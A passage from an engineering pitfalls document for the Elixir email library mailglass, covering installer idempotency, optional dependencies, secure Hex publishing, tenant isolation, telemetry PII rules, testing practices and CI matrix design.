A user runs `mix mailglass.install` to set up. Six months later, the user has customized `lib/my_app/mail.ex` heavily. They run `mix mailglass.install` again to pick up a new generator improvement. The lib overwrites their customizations without warning.

**Why it happens:**
Generators are usually one-shot. The "rerun safely" use case is non-obvious.

**How to avoid:**
- **Idempotent reruns write `.mailglass_conflict_*` sidecars** (per `PROJECT.md:46`): if the target file exists and differs from the template's expected content, write `path.ex.mailglass_conflict_2026-04-21` next to the existing file and instruct the user to merge manually.
- Default file write skips if the file is unchanged from the previous template version (tracked via a `.mailglass.toml` manifest of installed-template hashes).
- Golden-diff CI test: install on a fresh Phoenix host (`test/example/`), snapshot the output tree, fail PR if drift is uncommitted (per `prompts/mailglass-engineering-dna-from-prior-libs.md:257`).
- A second golden test: rerun the installer on the same host, assert no files were modified (idempotency).
- `--force` flag exists for clean overwrite, but is documented as destructive.

**Warning signs:**
- A user issue: "mailglass.install ate my changes."
- The installer doesn't read existing files before writing.
- No conflict-sidecar files in the install's output for any "modified target" test case.

**Phase to address:**
**v0.1 — Installer with golden-diff CI** (per D-12, `PROJECT.md:163`).

**Citation:** `PROJECT.md:46` (idempotent reruns write `.mailglass_conflict_*` sidecars); `prompts/mailglass-engineering-dna-from-prior-libs.md:257-260` (sigra/accrue installer model).

---

### DIST-04: Optional Deps Not Gated With `Code.ensure_loaded?/1`

**What goes wrong:**
`Mailglass.Outbound` references `Oban.insert/2` directly. The user doesn't have Oban installed. `mix compile` works (Oban is `optional: true`), but at runtime `deliver_later/2` raises `UndefinedFunctionError`. Worse: the warning suppression `@compile {:no_warn_undefined, Oban}` is forgotten, so dev compiles produce noisy warnings even when Oban IS installed.

**Why it happens:**
Optional deps require multi-line ceremony at every reference site; authors forget one site.

**How to avoid:**
- Single gateway per optional dep: `Mailglass.OptionalDeps.Oban` wraps every Oban call, declares `@compile {:no_warn_undefined, Oban}` once, and exposes `available?/0` + `insert/2` (with degraded fallback). Outbound calls `Mailglass.OptionalDeps.Oban.insert/2`, never `Oban.insert/2` directly.
- `deliver_later/2` falls back to `Task.Supervisor` with a warning when Oban absent (per `PROJECT.md:31`).
- CI lane: `mix compile --no-optional-deps --warnings-as-errors` MUST pass (per `PROJECT.md:135` and `prompts/elixir-opensource-libs-best-practices-deep-research.md:421-425`).
- Custom Credo check `Mailglass.Credo.NoBareOptionalDepReference` flags any `Oban.*`, `:opentelemetry.*`, `:mrml.*` reference outside the OptionalDeps gateway modules.

**Warning signs:**
- `mix compile --no-optional-deps` produces warnings or errors.
- A grep for `Oban\.` outside `Mailglass.OptionalDeps.Oban` returns hits.
- An adopter reports `UndefinedFunctionError` for an optional dep.

**Phase to address:**
**v0.1 — CI lane setup** (no-optional-deps gate); **v0.1 — OptionalDeps gateway pattern locked in design**.

**Citation:** `PROJECT.md:135-137` (constraints — optional deps with `Code.ensure_loaded?/1` guards + `--no-optional-deps --warnings-as-errors`); `prompts/mailglass-engineering-dna-from-prior-libs.md:276-285` (divergent §3.4); `prompts/elixir-opensource-libs-best-practices-deep-research.md:421-425` (test with `--no-optional-deps`).

---

### DIST-05: Hex Publish From PR (Security)

**What goes wrong:**
A CI job publishes to Hex on every push to a branch that includes "release" in the name. An attacker opens a PR named `release-fix-typo`, with malicious code in the diff. CI publishes a malicious version to Hex.

**Why it happens:**
"Just trigger publish on push" is the simple version. Branch-name matching feels safe but isn't.

**How to avoid:**
- **Hex publish runs only from a protected ref** (`PROJECT.md:48`, D-16). The publish workflow has `if: github.ref == 'refs/tags/v*' && github.event_name == 'push'` AND requires environment approval (GitHub Environments with required reviewers).
- `HEX_API_KEY` is a GitHub Environment secret, not a repo secret — only exposed to the publish job in the protected environment.
- PR-based jobs never see `HEX_API_KEY`. Forks NEVER trigger publish.
- The publish workflow runs `mix hex.publish --dry-run` first, validates the version matches the tag, then does the real publish.
- Manual fallback: `publish-hex.yml` with `workflow_dispatch` only, requiring environment approval.

**Warning signs:**
- The publish job runs on `pull_request`.
- `HEX_API_KEY` is referenced in any non-publish job.
- The publish workflow lacks an `environment:` key.

**Phase to address:**
**v0.1 — CI/CD setup**.

**Citation:** `PROJECT.md:48,168` (Hex publish from protected ref only, D-16); `prompts/elixir-oss-lib-ci-cd-best-practices-deep-research.md:243-249` (only publish from trusted refs/events; never from PRs or forks); `prompts/mailglass-engineering-dna-from-prior-libs.md:712-714` (gotcha §6 item 12 — secrets discipline).

---

### DIST-06: Manual CHANGELOG Edit Conflicting With Release Please

**What goes wrong:**
A maintainer hand-edits `CHANGELOG.md` to add a clarifying note. Release Please's next run can't reconcile the edits with its expected format. The release PR shows a confusing diff. The maintainer force-resolves, but the next release is missing entries that were in the manual edit.

**Why it happens:**
CHANGELOG looks like a doc you can edit. Release Please's contract that **it owns released sections** is non-obvious unless documented prominently.

**How to avoid:**
- **`MAINTAINING.md` documents the rule explicitly**: Release Please owns released sections; only the `## Unreleased` section can be hand-edited (and only when auto-generation needs help).
- A `CHANGELOG.md` header comment: `<!-- Released sections owned by Release Please. Edit only the Unreleased section. -->`.
- CI lane validates `CHANGELOG.md` parseable by Release Please's `keepachangelog` parser; fails on malformed entries.
- For exceptional manual additions, the maintainer adds a line in the next release's commit footer (`Release-Note: ...`) and Release Please picks it up.

**Warning signs:**
- A Release Please PR shows reordered or duplicated entries.
- Two consecutive releases have CHANGELOG drift visible in `git log -p CHANGELOG.md`.
- A maintainer force-pushes to a release branch.

**Phase to address:**
**v0.1 — Release process documented in `MAINTAINING.md`**.

**Citation:** `prompts/mailglass-engineering-dna-from-prior-libs.md:74-76` (CHANGELOG format: Release Please owns released sections; contributors write Unreleased entries by hand only when the auto-generation needs help); `prompts/elixir-oss-lib-ci-cd-best-practices-deep-research.md:330-336` (anti-pattern: manually edit CHANGELOG.md and versions if Release Please is managing them).

---

### PHX-01: Library Reading Other Apps' Application Env (Recompilation Hazard)

**What goes wrong:**
`Mailglass.Outbound` calls `Application.fetch_env!(:phoenix, :json_library)` to use the host's JSON library. Per the Application docs, this creates a compile-time dep on the `:phoenix` app's config, causing mailglass to recompile whenever the host's Phoenix config changes — and breaks if the host hasn't started Phoenix yet.

**Why it happens:**
"It's just config" — but reading another app's config is a documented anti-pattern.

**How to avoid:**
- mailglass reads ONLY its own config (`Application.get_env(:mailglass, ...)`).
- If a host-app value is needed, the host passes it explicitly (e.g., `config :mailglass, json: Jason` or via the install task generating a `runtime.exs` block).
- Custom Credo check `Mailglass.Credo.NoOtherAppEnvReads` flags any `Application.get_env/2`/`fetch_env!/2` whose first arg is not `:mailglass`.

**Warning signs:**
- `Application.fetch_env!(:phoenix, ...)` or `Application.fetch_env!(:ecto, ...)` in `lib/mailglass/`.
- Adopter reports recompiles when changing unrelated Phoenix config.
- `mix compile --warnings-as-errors` warns about reading another app's env.

**Phase to address:**
**v0.1 — Config module design**.

**Citation:** `prompts/elixir-opensource-libs-best-practices-deep-research.md:101-110` ("Never read other apps' config directly — Application docs explicitly warn"); `prompts/mailglass-engineering-dna-from-prior-libs.md:691-694`.

---

### PHX-02: Library Defining Phoenix Routes That Conflict With Adopter's

**What goes wrong:**
`mailglass_admin` declares a router macro that hardcodes routes at `/admin/mail/*`. The adopter already has `/admin/*` routes for their own admin. Conflict at compile time, or worse: silent shadowing where the wrong LiveView serves the request.

**Why it happens:**
Authors forget that the adopter owns the routing tree. Hardcoding paths feels like "convention over configuration."

**How to avoid:**
- `mailglass_admin "/path"` macro takes the path as the **first argument** — adopter chooses the mount point. No default.
- The macro generates routes as `live "/" , DashboardLive` (relative), never `live "/admin/mail" , ...` (absolute).
- LiveView session cookie name includes a configurable suffix to avoid collision with the host app's main session.
- Phoenix.PubSub topics are namespaced as `"mailglass:#{tenant}:#{stream}:#{event}"` — never bare `"mail"` or `"events"`.
- Generated `mix mailglass.install` output uses `/mailglass-admin` as the default mount path with a comment "change this to whatever you like".

**Warning signs:**
- A route conflict on `mix compile`.
- The router macro has no path argument.
- Topic strings in the codebase are unprefixed (e.g., `"events"` instead of `"mailglass:events"`).

**Phase to address:**
**v0.1 — `mailglass_admin` router macro design**.

**Citation:** `prompts/mailglass-engineering-dna-from-prior-libs.md:483-493` (mounted in adopter's router, mount path is adopter's choice); field knowledge on Phoenix.PubSub topic namespacing.

---

### PHX-03: LiveView Assets Bundled in Core Lib (Bloat)

**What goes wrong:**
The `mailglass` core package bundles 800KB of compiled CSS + JS for the admin LiveView, even for adopters who only use the transactional send features and never mount the admin. Hex package size triples; deps fetch slower; the lib feels heavy.

**Why it happens:**
"Just put the assets next to the code that uses them." Authors don't draw the package boundary at the value boundary.

**How to avoid:**
- `mailglass` (core) ships **zero** static assets. No `priv/static/`. No esbuild config.
- `mailglass_admin` (sibling package) owns ALL admin assets in its own `priv/static/`.
- Hex package whitelist (`PROJECT.md`-style explicit `files:` in mix.exs) ensures core never accidentally includes admin assets.
- A CI test inspects the published tarball size: `mailglass` MUST be <500KB; `mailglass_admin` MUST be <2MB. Hard fail above thresholds.

**Warning signs:**
- `du -sh priv/static/` in core lib > 0.
- The Hex package size for `mailglass` exceeds 500KB.
- A user without admin mounted ships extra assets to their CDN.

**Phase to address:**
**v0.1 — Sibling package boundary lock**.

**Citation:** `prompts/mailglass-engineering-dna-from-prior-libs.md:38-42` (mix.exs whitelists files explicitly; never auto-include the whole repo); `PROJECT.md:153` (D-01 sibling packages from v0.1).

---

### PHX-04: Migration Ordering Across `mailglass` + `mailglass_inbound` + Adopter App

**What goes wrong:**
Adopter app has migration `20260101000000_create_users.exs` (with a `users` table). Mailglass migration `20260201000000_create_mailglass_subscribers.exs` references `users(id)` via FK. Mailglass_inbound migration `20260301000000_create_mailglass_inbound.exs` references `mailglass_subscribers(id)`. When adopter runs `mix ecto.migrate`, the order is correct only because timestamps happen to align. Add a fourth package or a backdated migration and the world breaks.

**Why it happens:**
Phoenix's timestamp-based migration order is fragile across packages.

**How to avoid:**
- **mailglass migrations have NO foreign keys to adopter tables.** Use polymorphic `(owner_type, owner_id)` (per engineering DNA §3.7) — owner_id is a `:string` that holds UUID/ULID/bigint losslessly.
- mailglass_inbound migrations have NO FK to mailglass tables either; they're independent schemas.
- Each package generates migrations into its own subdirectory (`priv/repo/migrations/mailglass/`, `priv/repo/migrations/mailglass_inbound/`) and offers a mix task `mix mailglass.copy_migrations` that copies them to the host's migrations dir at install time, with a stable timestamp prefix per package version.
- Idempotent migration template: each migration starts with `if Repo.table_exists?("mailglass_subscribers"), do: ...` to no-op on second install.
- Document in `guides/installation.md`: the order of `mix mailglass.install`, `mix mailglass_inbound.install`, then `mix ecto.migrate`.

**Warning signs:**
- A mailglass migration declares `references(:users, ...)`.
- Adopter reports "migration ordering broke after upgrade."
- Migration timestamps in mailglass are timestamped at the time of **rerun**, not stable per package version.

**Phase to address:**
**v0.1 — Schema design** (polymorphic ownership); **v0.5+ — `mailglass_inbound` package** (independent migrations).

**Citation:** `prompts/mailglass-engineering-dna-from-prior-libs.md:333-351` (polymorphic ownership for User/Organization/Team); `PROJECT.md:67-72` (`mailglass_inbound` as separate sibling).

---

### PHX-05: Multi-Tenant Scope Leak in Admin LiveView

**What goes wrong:**
`mailglass_admin` LiveView fetches `Mailglass.Suppressions.list/0` (no tenant scope). Admin user from tenant A sees suppressions from tenant B. Catastrophic data leak. Because the admin lives in the adopter's app and is mounted under their auth, the leak is invisible to the lib until reported.

**Why it happens:**
Authors test the admin in single-tenant dev, then ship. Multi-tenancy is a v0.1 promise (D-09) that needs enforcement at every query site.

**How to avoid:**
- **Custom Credo check `Mailglass.Credo.NoUnscopedTenantQueryInLib`** (per engineering DNA §2.8): every Repo query on a tenanted schema (`mailglass_subscribers`, `mailglass_lists`, `mailglass_campaigns`, `mailglass_sends`, `mailglass_suppressions`, `mailglass_inbound`, `mailglass_events`) MUST pass through `Mailglass.Tenancy.scope/2`.
- `Mailglass.Tenancy.scope/2` has a `prepare_query` callback that injects the tenant filter at query-build time; bypassing it requires explicitly passing `scope: :unscoped` (admin-only, audited via telemetry event `[:mailglass, :ops, :unscoped_query, :executed]`).
- Multi-tenant property test: spawn 2 tenants, write 100 records each, query from tenant A in 50 admin LiveView assigns paths, assert zero tenant B records ever appear.
- Admin LiveView mount fails closed if no `Mailglass.Auth.current_actor/1` returns a tenant.

**Warning signs:**
- A `Mailglass.Repo.all(Mailglass.Suppression)` (no scope) appears anywhere in `lib/`.
- A user issue: "I see another customer's data."
- The Credo check is disabled with `# credo:disable-for-next-line` without a justification comment.

**Phase to address:**
**v0.1 — Multi-tenancy primitives**; enforced through **v0.5 — admin LiveView**.

**Citation:** `prompts/mailglass-engineering-dna-from-prior-libs.md:181-187` (NoUnscopedTenantQueryInLib Credo check); `PROJECT.md:159` (D-09 multi-tenancy first-class from v0.1); `PROJECT.md:40` (Mailglass.Tenancy.scope/2).

---

### PHX-06: Phoenix.PubSub Topic Naming Collision

**What goes wrong:**
mailglass broadcasts on `"events"` and `"sends"`. The adopter app already broadcasts on those topics for its own domain. Cross-talk: admin LiveView re-renders on every adopter event; adopter LiveView errors on `:mailglass_send` payloads it doesn't expect.

**Why it happens:**
Phoenix.PubSub topics are global per Endpoint. Authors forget the namespace responsibility.

**How to avoid:**
- All mailglass topics namespaced as `"mailglass:#{tenant_id}:#{kind}:#{subject_id}"`. Bare topics forbidden.
- A `Mailglass.PubSub` helper module is the only place broadcasts originate; it builds topic strings from typed args.
- Custom Credo check `Mailglass.Credo.PrefixedPubSubTopics` flags any string literal starting with `"events"`, `"sends"`, `"mail"`, etc., that doesn't start with `"mailglass:"`.
- Document the topic naming scheme in `guides/multi-tenancy.md` and `guides/pubsub.md`.

**Warning signs:**
- `Phoenix.PubSub.broadcast(MyApp.PubSub, "events", ...)` (bare topic) anywhere.
- Adopter LiveView crashes on unexpected mailglass payloads.
- Topic strings vary across the codebase (some prefixed, some not).

**Phase to address:**
**v0.1 — Telemetry/PubSub design**.

**Citation:** Field knowledge on Phoenix.PubSub global topic namespace; pattern derived from `prompts/mailglass-engineering-dna-from-prior-libs.md:116-128` (telemetry naming convention applied to PubSub).

---

### OBS-01: PII in Telemetry Metadata (Recipient Addresses, Bodies)

**What goes wrong:**
Telemetry stop event includes `meta.to: "alice@example.com"` and `meta.body: "<full HTML>"`. Adopter wires telemetry to OpenTelemetry. Trace data with PII flows to a SaaS observability vendor. GDPR violation; potentially CCPA / HIPAA depending on content. Discovered months later in a security audit.

**Why it happens:**
"More metadata is better, right?" — wrong for telemetry. Authors don't think of telemetry as a data-egress channel.

**How to avoid:**
- **Hard rule** (per `PROJECT.md:42,143` and engineering DNA): telemetry metadata includes counts/statuses/IDs/latencies ONLY. Never raw recipient lists, bodies, headers, response payloads.
- **Custom Credo check `Mailglass.Credo.NoPiiInTelemetryMeta`** (per engineering DNA §2.8) flags any literal `:to`, `:from`, `:cc`, `:bcc`, `:body`, `:html_body`, `:text_body`, `:subject`, `:headers`, `:recipient`, `:email` keys in maps passed to `:telemetry.execute/3` or `:telemetry.span/3`.
- Standard meta keys (whitelisted): `:tenant_id`, `:mailable`, `:provider`, `:status`, `:message_id`, `:delivery_id`, `:event_id`, `:latency_ms`, `:recipient_count`, `:bytes`, `:retry_count`. Documented in `guides/telemetry.md` as the closed set.
- A property test loops through every emitted telemetry event and asserts the meta map keys are a subset of the whitelist.

**Warning signs:**
- Telemetry handler logs in dev show recipient emails.
- The whitelist of allowed meta keys is missing or undocumented.
- Adopter wires telemetry to OpenTelemetry and traces show emails.

**Phase to address:**
**v0.1 — Telemetry design**, **v0.1 — Credo check shipped**.

**Citation:** `PROJECT.md:42,143` (telemetry metadata never includes recipient addresses, message bodies, response payloads); `prompts/mailglass-engineering-dna-from-prior-libs.md:131-135,181-187` (engineering DNA: telemetry rules + NoPiiInTelemetryMeta Credo check); `prompts/Phoenix needs an email framework not another mailer.md:143-145`.

---

### OBS-02: Raising From Telemetry Handlers (Breaks Business Logic)

**What goes wrong:**
A telemetry handler does `Logger.info("send: #{inspect(meta.send_id)}")` but `send_id` is missing in some payloads. Logger raises a `KeyError`. `:telemetry.execute/3` re-raises (Telemetry's default behavior is "raise on handler error"). The send pipeline crashes mid-Multi. The send appears successful in the provider but the lib never recorded it.

**Why it happens:**
Telemetry handlers feel like fire-and-forget — until they're not.

**How to avoid:**
- **Library code wraps every `:telemetry.execute/3` call in `try/rescue`** at the emit site OR registers handlers via `:telemetry.attach/4` with an explicit `:on_error` handler (Telemetry 1.0+ supports detaching on handler exceptions).
- mailglass's own handlers (e.g., the Postgres event ledger writer) NEVER raise; they log and increment a `[:mailglass, :ops, :telemetry_handler_error]` counter.
- Document in `guides/telemetry.md`: "Adopter handlers should never raise. mailglass's emit sites are protected, but downstream handlers can still misbehave; we recommend wrapping handlers in `try/rescue` and emitting your own error event."
- Property test: register a handler that always raises, run a full send pipeline, assert the send still completes.

**Warning signs:**
- A Send is missing from the event ledger but visible at the provider.
- Logs show `:telemetry.execute/3` re-raising a handler error.
- mailglass's own handlers don't have `try/rescue`.

**Phase to address:**
**v0.1 — Telemetry module design**.

**Citation:** `prompts/mailglass-engineering-dna-from-prior-libs.md:131-133` (universal rule: never raise from telemetry); `prompts/elixir-opensource-libs-best-practices-deep-research.md:639-643` (operational anti-pattern: forcing rescue-based error handling); convergent across all 4 prior libs.

---

### OBS-03: OpenTelemetry Reference Without `Code.ensure_loaded?/1` Gate

**What goes wrong:**
`Mailglass.Telemetry.OpenTelemetryBridge` references `:opentelemetry_api` directly. The adopter doesn't have the OpenTelemetry deps. Compile fails OR `--no-optional-deps` build emits warnings; production startup crashes with `UndefinedFunctionError`.

**Why it happens:**
OpenTelemetry's API surface looks just like any other module — easy to forget it's optional.

**How to avoid:**
- All OpenTelemetry references go through `Mailglass.OptionalDeps.OpenTelemetry` (single gateway, see DIST-04).
- That gateway declares `@compile {:no_warn_undefined, [:opentelemetry, :opentelemetry_api]}` and uses `Code.ensure_loaded?/1` in every public function.
- Bridge module is started only if `Application.get_env(:mailglass, :opentelemetry, false) and Code.ensure_loaded?(:opentelemetry)`.
- CI's `--no-optional-deps` lane catches missing gates.

**Warning signs:**
- Direct `:opentelemetry.with_span/3` calls outside the gateway module.
- `mix compile --no-optional-deps` warns about undefined OpenTelemetry symbols.
- Adopter without OpenTelemetry sees a startup crash.

**Phase to address:**
**v0.1 — OptionalDeps gateway pattern**.

**Citation:** `prompts/mailglass-engineering-dna-from-prior-libs.md:131-135` (Conditional OpenTelemetry bridge: `Code.ensure_loaded?(:opentelemetry)` gate, `@compile {:no_warn_undefined, :opentelemetry}` to avoid warnings when the optional dep is absent).

---

### OBS-04: Telemetry Event Naming Inconsistent With Convention

**What goes wrong:**
Some events use `[:mailglass, :send, :start]` (3 levels), others `[:mailglass, :outbound, :send, :start]` (4 levels), others `[:mail, :outbound, :send, :start]` (wrong root). Adopter dashboards subscribe with prefix filters and miss half the events. Documentation says one thing; code does another.

**Why it happens:**
Naming conventions are written down but not enforced. Drift over phases is silent.

**How to avoid:**
- **Strict 4-level convention** (per `PROJECT.md:42` and engineering DNA §2.5): `[:mailglass, :domain, :resource, :action, :start | :stop | :exception]`. Documented in `guides/telemetry.md` as the contract.
- All emits go through `Mailglass.Telemetry.span/3` (project-local wrapper), which prepends `:mailglass` and validates the rest of the event list at compile time (NimbleOptions schema).
- Custom Credo check `Mailglass.Credo.TelemetryEventConvention` flags any `:telemetry.execute/3` not preceded by the wrapper.
- A test enumerates all `Mailglass.Telemetry.span/3` call sites (via `mix xref`), extracts event lists, asserts the 4-level convention.

**Warning signs:**
- Two events for the same operation use different prefixes.
- A new phase adds events without referencing `guides/telemetry.md`.
- Adopter's prefix-filter handler misses events.

**Phase to address:**
**v0.1 — Telemetry module design with wrapper**.

**Citation:** `prompts/mailglass-engineering-dna-from-prior-libs.md:108-128` (telemetry span pattern + 4-level naming convention with full event catalog).

---

### OBS-05: Logging Full Provider Response Payloads at Info Level

**What goes wrong:**
On every send, `Logger.info("provider response: #{inspect(response)}")` dumps the full JSON. Postmark's response includes the full message body (echo). Production logs grow at 10MB/min; SaaS log vendor charges spike; PII in logs.

**Why it happens:**
"Inspect everything for debugging" is the dev default; nobody downgrades it for prod.

**How to avoid:**
- mailglass logs ONLY: at `:debug` level (off in prod by default), the operation name + IDs + statuses + latencies. Never raw response bodies.
- The full provider payload is preserved in `mailglass_events.payload` (JSONB, queryable, but not in stdout/stderr).
- `Logger.metadata/1` carries `request_id`, `tenant_id`, `mailable`, `delivery_id` — structured logging (per `PROJECT.md:79`).
- Custom Credo check `Mailglass.Credo.NoFullResponseInLogs` flags any `Logger.info("...inspect(response)...")` pattern at info level or above.

**Warning signs:**
- Production log volume scales linearly with send volume.
- Logs contain full HTML bodies or recipient lists.
- A grep for `Logger.info` shows `inspect(response)` patterns.

**Phase to address:**
**v0.1 — Logging conventions in `guides/telemetry.md`**.

**Citation:** `prompts/elixir-opensource-libs-best-practices-deep-research.md:443-451` (Logger usage: low volume, diagnostic, safe for production, free of secret leakage); `PROJECT.md:79` (structured logs with request_id, tenant_id, mailable, delivery_id).

---

### TEST-01: Mocking Instead of Using Fake Adapter (Drift Between Mock and Real)

**What goes wrong:**
Tests use `Mox.expect(MyApp.SwooshMock, :deliver, fn _ -> {:ok, %{id: "fake"}} end)`. Real Swoosh's actual return shape differs (`{:ok, %{id: ..., headers: [...], status: 200}}`). The mock passes; integration breaks. Worse: the mock allows tests to assert behaviors that real Swoosh forbids (e.g., sending without a `from` field).

**Why it happens:**
Mox is the well-known Elixir mocking lib; authors reach for it reflexively. Building a stateful Fake feels like more work upfront.

**How to avoid:**
- **`Mailglass.Adapter.Fake` is the required release-gate target** (per `PROJECT.md:36,167` and engineering DNA §3.5): in-memory, deterministic, time-advanceable, with the EXACT same return-shape contract as real adapters. Released-gate CI runs the full test suite against Fake.
- Real provider tests (Postmark sandbox, SendGrid test mode, MailHog SMTP) are **advisory only** — daily cron + `workflow_dispatch`, never block PRs.
- Mox is permitted ONLY for behaviour interfaces where stateful mocking adds no value (e.g., `Mailglass.Auth` callbacks).
- Per-domain `Case` templates (`Mailglass.MailerCase`) wire Fake automatically; tests never instantiate adapter mocks directly.

**Warning signs:**
- A test file imports `Mox` and mocks `Swoosh.Adapter`-like behavior.
- A mock returns a shape that differs from the real adapter's typespec.
- The Fake adapter doesn't have parity with real adapters' return shapes (no contract test).

**Phase to address:**
**v0.1 — Fake adapter as release gate** (D-13).

**Citation:** `PROJECT.md:36,167` (D-13 Fake adapter release gate); `prompts/mailglass-engineering-dna-from-prior-libs.md:286-300` (divergent §3.5: accrue's Fake-first lesson "Keep provider-backed checks advisory while Fake-backed host proof remains deterministic release blocker").

---

### TEST-02: Real Provider Tests in PR-Blocking CI (Flaky, Slow, Expensive)

**What goes wrong:**
Every PR runs against real Postmark sandbox. A Postmark API blip causes a CI failure. PRs sit blocked for hours. The Postmark sandbox quota is exhausted on a busy day. Costs accrue. Contributors get frustrated and stop opening PRs.

**Why it happens:**
"More realistic tests = better." But realistic ≠ deterministic.

**How to avoid:**
- Real-provider tests are tagged `@tag :provider_live` and excluded from PR CI by default.
- Real-provider tests run on **daily cron + `workflow_dispatch`** (per engineering DNA), in their own workflow with `permissions: contents: read` and access to provider sandbox secrets.
- Failures in the cron job open an issue automatically (via `actions/github-script`), but never block PRs.
- The Fake adapter is the merge gate; it runs in <30s.

**Warning signs:**
- A PR is blocked because Postmark's API returned 503.
- CI runs against a billable provider sandbox per push.
- The "real provider" lane has `pull_request:` trigger.

**Phase to address:**
**v0.1 — CI lane structure**.

**Citation:** `PROJECT.md:48,166` (D-13 + CI structure); `prompts/mailglass-engineering-dna-from-prior-libs.md:53-57,711` (Integration / golden lane "for paths that touch it"; provider sandboxes advisory).

---

### TEST-03: Property Tests Added Too Late

**What goes wrong:**
The lib ships v0.1 without property tests on signature verification, idempotency keys, or unsubscribe-token round-tripping. v0.2 adds StreamData tests; they immediately find 4 latent bugs that have been live for 6 months. Adopters who hit them filed issues; some moved away.

**Why it happens:**
Property tests feel like a "polish" task. The bugs they find are non-obvious until they fire.

**How to avoid:**
- **Property tests on signature verification, idempotency keys, unsubscribe tokens, and bounce classification are v0.1 release gates** (per `PROJECT.md:48,80`). Listed explicitly: "StreamData property tests (headers, idempotency keys, signature verification)."
- Property test design pattern documented: generate sequences of (event, replay-count) and assert invariants (e.g., "applying event N times produces same final state as applying it once").
- New phases that touch security-sensitive surface (signing, tokens, parsers) MUST add property tests as part of `VERIFICATION.md`.

**Warning signs:**
- v0.1 release with zero StreamData usage on the public surface.
- A new feature touching tokens/signatures lands without property tests.
- A latent bug is found in production that property tests would have caught.

**Phase to address:**
**v0.1 — Test pyramid (property tests at gate)**.

**Citation:** `PROJECT.md:48,80,166` (StreamData property tests as v0.1 gate); `prompts/mailglass-engineering-dna-from-prior-libs.md:140-146` (note: prior libs treated property tests as "absent unless domain is genuinely algorithmic" — mailglass intentionally diverges from this because email's signing/idempotency surfaces ARE algorithmic).

---

### TEST-04: Doctests That Don't Actually Run (Pretty Docs, Untested)

**What goes wrong:**
README has a beautiful "Quick Start" code block. ExDoc renders it nicely. But it's not a doctest, never compiled, and references a function that was renamed in v0.3. Adopters copy-paste, get `UndefinedFunctionError`, file an issue.

**Why it happens:**
Markdown code blocks LOOK like documentation; they're easy to forget aren't tested.

**How to avoid:**
- **Doc-contract tests** (per engineering DNA §2.7): `test/mailglass/docs_contract_test.exs` extracts the README's "Quick Start" block, asserts it parses with `Code.string_to_quoted!/1`, and asserts each public function referenced exists with the right arity.
- Doctests on small pure functions (`Mailglass.Compliance.add_unsubscribe_headers/1`, `Mailglass.Suppression.suppressed?/2`).
- A `mix verify.docs_contract` task in CI runs all doc-contract tests AND `mix docs --warnings-as-errors`.
- Every guide's "code example" section is either a doctest target or grep-checked by a verify script.

**Warning signs:**
- README references a function that was renamed (find via grep).
- `mix docs` succeeds but the rendered code doesn't compile.
- A user issue: "I copy-pasted from the docs and it doesn't work."

**Phase to address:**
**v0.1 — Doc-contract tests at gate**.

**Citation:** `prompts/mailglass-engineering-dna-from-prior-libs.md:148-176` (doc-contract tests are the highest-leverage convergent pattern; every project credits it for catching silent doc rot).

---

### TEST-05: Sandbox Not Used for Ecto Tests (State Leak Between Tests)

**What goes wrong:**
Test A inserts a suppression. Test B asserts no suppressions exist. Test B fails because A's data leaked. Or worse: tests pass individually but fail when run together — flaky CI.

**Why it happens:**
Phoenix generators set up `Ecto.Adapters.SQL.Sandbox` by default, but library authors writing standalone test infrastructure forget.

**How to avoid:**
- `Mailglass.MailerCase` and `Mailglass.WebhookCase` use `Ecto.Adapters.SQL.Sandbox.checkout/1` in `setup` and `:manual` mode in `test_helper.exs`.
- The example Phoenix host in `test/example/` uses sandbox too.
- Async tests (`use Mailglass.MailerCase, async: true`) MUST be safe with sandbox's `:shared` mode for cross-process tests (e.g., webhook plug → handler running in another process).
- Lint check: any test using `Mailglass.Repo` directly without `setup :sandbox` fails.

**Warning signs:**
- Tests fail intermittently depending on order.
- A test asserts data state without first cleaning up.
- `mix test --seed 0` diverges from `mix test --seed RANDOM`.

**Phase to address:**
**v0.1 — Test infrastructure setup** (`test/support/`).

**Citation:** Field knowledge from Phoenix/Ecto best-practices research; reinforced by `prompts/mailglass-engineering-dna-from-prior-libs.md:138-146` (per-domain `Case` templates with sandbox).

---

### TEST-06: Time-Dependent Tests Without `Mailglass.Clock` Injection

**What goes wrong:**
Test asserts "soft-bounce escalation triggers at 5 in 7 days" by inserting 5 records with `inserted_at: DateTime.utc_now()` and... waiting 7 days? No — the test fakes by manipulating timestamps directly. The test is brittle: changes to the escalation logic break the test in non-obvious ways. Worse: production code reads `DateTime.utc_now/0` directly, making time-travel testing impossible.

**Why it happens:**
Time is the universal global. Authors don't think to inject it.

**How to avoid:**
- All time reads in mailglass go through `Mailglass.Clock.utc_now/0` — a thin wrapper that defaults to `DateTime.utc_now/0` but is replaceable in tests.
- `Mailglass.Adapter.Fake` (per `PROJECT.md:36`) is "time-advanceable" — it owns its own clock state.
- `Mailglass.MailerCase` provides `advance_time(duration)` helpers.
- Custom Credo check `Mailglass.Credo.NoDirectDateTimeNow` flags any `DateTime.utc_now/0` outside `Mailglass.Clock`.

**Warning signs:**
- A test sleeps to wait for time-based logic.
- A `DateTime.utc_now/0` call in `lib/mailglass/`.
- Soft-bounce escalation logic is tested by manipulating raw timestamps.

**Phase to address:**
**v0.1 — Clock module + Fake time control**.

**Citation:** `PROJECT.md:36` (Fake adapter is time-advanceable); field knowledge on dependency injection of time in BEAM apps.

---

### CI-01: Required Matrix Too Wide (Slow PRs, Contributor Friction)

**What goes wrong:**
The PR-blocking matrix is `Elixir [1.16, 1.17, 1.18] × OTP [25, 26, 27] × Postgres [14, 15, 16]` = 27 cells. Each cell takes 3 minutes. PRs sit for 81 minutes. Contributors abandon. Maintainer's coffee gets cold.

**Why it happens:**
"Test everything, then we know it works." But for a Phoenix-1.8+/Elixir-1.18+/OTP-27+ floor (per `PROJECT.md:135`), the matrix should be tiny.

**How to avoid:**
- **Required matrix**: Elixir 1.18 / OTP 27 / Postgres 16 (the floor). One cell. Maybe a second cell for Elixir-stable / OTP-stable.
- **Optional/nightly matrix**: wider OTP/Elixir/Postgres combinations, runs daily, advisory only.
- Per `prompts/elixir-oss-lib-ci-cd-best-practices-deep-research.md:152-167`: "Use two layers of confidence: fast required matrix + slow optional matrix."
- `concurrency` group with `cancel-in-progress: true` kills stale runs on force-push.
- Path filters skip CI on `.md`/`.planning/`/`guides/` only changes.

**Warning signs:**
- PR CI takes >5 minutes for a code change.
- Contributors complain about CI wait times.
- The required matrix is >3 cells.

**Phase to address:**
**v0.1 — CI/CD setup**.

